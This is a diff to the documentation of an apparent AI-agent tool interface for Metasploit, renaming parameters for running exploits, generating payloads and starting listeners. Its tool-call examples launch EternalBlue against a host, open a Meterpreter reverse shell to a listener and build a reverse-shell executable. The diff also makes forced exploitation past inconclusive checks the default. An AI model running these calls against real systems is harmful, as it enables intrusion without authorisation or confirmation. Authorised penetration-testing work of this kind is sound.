@@ -33,12 +33,13 @@ List available Metasploit exploit modules with optional filtering.
 Execute a Metasploit exploit module.
 
 **Parameters:**
-- `module_name` (string): Exploit module name (e.g., "windows/smb/ms17_010_eternalblue")
+- `module` (string): Exploit module name (e.g., "exploit/windows/smb/ms17_010_eternalblue")
 - `options` (dict/string): Module options (e.g., {"RHOSTS": "192.168.1.100"})
-- `payload_name` (optional, string): Payload to use
+- `payload` (optional, string): Payload to use
 - `payload_options` (optional, dict/string): Payload-specific options
-- `run_as_job` (optional, bool): Run as background job (default: false)
+- `run_as_job` (optional, bool): Run as background job (default: true)
 - `check_vulnerability` (optional, bool): Check if target is vulnerable first (default: false)
+- `force_exploit` (optional, bool): Force exploitation past inconclusive checks (default: true)
 - `timeout_seconds` (optional, int): Timeout for exploit execution (default: 60)
 
 **Returns:**
@@ -65,15 +66,15 @@ List available Metasploit payload modules with optional filtering.
 Generate a Metasploit payload.
 
 **Parameters:**
-- `payload_type` (string): Payload type (e.g., "windows/meterpreter/reverse_tcp")
-- `format_type` (string): Output format ("raw", "exe", "python", etc.)
+- `payload` (string): Payload type (e.g., "windows/meterpreter/reverse_tcp")
+- `format` (string): Output format ("raw", "exe", "python", etc.)
 - `options` (dict/string): Payload options (e.g., {"LHOST": "192.168.1.100", "LPORT": 4444})
 - `encoder` (optional, string): Encoder to use
 - `iterations` (optional, int): Encoding iterations
 - `bad_chars` (optional, string): Bad characters to avoid
 - `output_filename` (optional, string): Desired filename
-- `reverse_listener_bind_address` (optional, string): Bind address (defaults to 0.0.0.0)
-- `reverse_listener_bind_port` (optional, int): Bind port (defaults to LPORT)
+- `reverselistenerbindaddress` (optional, string): Bind address (defaults to 0.0.0.0)
+- `reverselistenerbindport` (optional, int): Bind port (defaults to LPORT)
 
 **Returns:**
 - `status`: "success" or "error"
@@ -120,13 +121,13 @@ Terminate an active session.
 Start a new Metasploit handler (listener) as a background job.
 
 **Parameters:**
-- `payload_type` (string): Payload to handle (e.g., "windows/meterpreter/reverse_tcp")
+- `payload` (string): Payload to handle (e.g., "windows/meterpreter/reverse_tcp")
 - `lhost` (string): Listener host address (what target connects to)
 - `lport` (int): Listener port (1-65535)
 - `additional_options` (optional, dict/string): Additional payload options
 - `exit_on_session` (optional, bool): Exit handler after first session (default: false)
-- `reverse_listener_bind_address` (optional, string): Bind address (defaults to 0.0.0.0)
-- `reverse_listener_bind_port` (optional, int): Bind port (defaults to lport)
+- `reverselistenerbindaddress` (optional, string): Bind address (defaults to 0.0.0.0)
+- `reverselistenerbindport` (optional, int): Bind port (defaults to lport)
 
 **Returns:**
 - `status`: "success" or "error"
@@ -190,10 +191,10 @@ Common error scenarios:
 {
   "tool": "start_listener",
   "arguments": {
-    "payload_type": "windows/meterpreter/reverse_tcp",
+    "payload": "windows/meterpreter/reverse_tcp",
     "lhost": "192.168.1.100",
     "lport": 4444,
-    "reverse_listener_bind_address": "0.0.0.0"
+    "reverselistenerbindaddress": "0.0.0.0"
   }
 }
 ```
@@ -204,12 +205,12 @@ Common error scenarios:
 {
   "tool": "run_exploit",
   "arguments": {
-    "module_name": "windows/smb/ms17_010_eternalblue",
+    "module": "windows/smb/ms17_010_eternalblue",
     "options": {
       "RHOSTS": "192.168.1.50",
       "RPORT": 445
     },
-    "payload_name": "windows/x64/meterpreter/reverse_tcp",
+    "payload": "windows/x64/meterpreter/reverse_tcp",
     "payload_options": {
       "LHOST": "192.168.1.100",
       "LPORT": 4444
@@ -225,8 +226,8 @@ Common error scenarios:
 {
   "tool": "generate_payload",
   "arguments": {
-    "payload_type": "windows/meterpreter/reverse_tcp",
-    "format_type": "exe",
+    "payload": "windows/meterpreter/reverse_tcp",
+    "format": "exe",
     "options": {
       "LHOST": "192.168.1.100",
       "LPORT": 4444
